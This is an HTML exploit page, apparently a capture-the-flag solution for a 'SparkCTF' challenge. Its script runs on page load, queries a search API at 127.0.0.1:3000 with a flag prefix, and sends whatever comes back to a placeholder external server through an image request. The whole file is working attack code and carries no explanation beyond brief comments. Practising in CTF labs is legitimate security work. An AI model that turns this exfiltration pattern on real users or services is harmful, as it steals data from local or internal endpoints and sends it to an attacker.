<!DOCTYPE html>
<html>
<head>
  <title>Exploit</title>
</head>
<body>
  <script>
    function leakFlag() {
      let payload = "SparkCTF{";
      let externalServer = "http://your-external-server.com/log?data="; // Change this to your own server URL

      // Function to send data to your external server
      function exfiltrate(data) {
        new Image().src = externalServer + encodeURIComponent(data);
      }

      // Use only the HTTP URL since our local endpoint is not HTTPS
      let url = "http://127.0.0.1:3000/api/search?input=" + payload;
      
      // Perform a fetch request
      fetch(url)
        .then(response => response.text())
        .then(data => {
          console.log("Success:", data);
          exfiltrate(data); // Send the response out
        })
        .catch(err => console.error("Error:", err));

      // Also trigger an image-based request as a fallback
      let img = new Image();
      img.src = url;
      document.body.appendChild(img);
    }

    leakFlag();
  </script>
</body>
</html>
